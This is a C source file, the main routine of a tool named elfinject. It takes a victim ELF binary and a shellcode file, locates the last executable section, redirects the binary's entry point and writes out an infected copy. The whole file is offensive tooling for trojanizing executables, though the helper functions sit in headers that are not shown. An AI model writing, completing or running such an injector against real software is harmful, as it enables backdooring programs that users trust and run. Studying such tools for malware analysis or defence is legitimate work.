#include <stdio.h>
#include "debug.h"
#include "elfinfo.h"

void help() {
    ACT("./elfinject <victim> <shellcode.bin> <outfile>");
    exit(1);
}

void work(char *victim_name, char *shcd_name, char *outfile) {

    shinfo *last_sinfo = NULL;
    fmap_t victim;
    fmap_t shellcode;
    target_t target;
    uint32_t old_entry;
    init_fmap(&victim, victim_name);
    init_fmap(&shellcode, shcd_name);

    // last_sinfo allocated in find_last_ex_section
    last_sinfo = find_last_ex_section(&victim, shellcode.size);

    adjust_offset(&victim, last_sinfo, &target, shellcode.size);

    adjust_entry(&victim, &target, &old_entry);

    writeback(&victim, &shellcode, outfile, &target, &old_entry);
    
    free(last_sinfo);
    last_sinfo = NULL;

    deinit_fmap(&victim);
    deinit_fmap(&shellcode);
}


int main(int argc, char** argv)
{
    char *victim  = NULL;
    char *shcd    = NULL;
    char *outfile = NULL;

    if(argc != 4) {
        goto help;
    }

    victim  = argv[1];
    shcd    = argv[2];
    outfile = argv[3];

    if( victim == NULL || shcd == NULL || outfile == NULL) goto help;

    work(victim, shcd, outfile);
    return 0;

help:
    help();
}
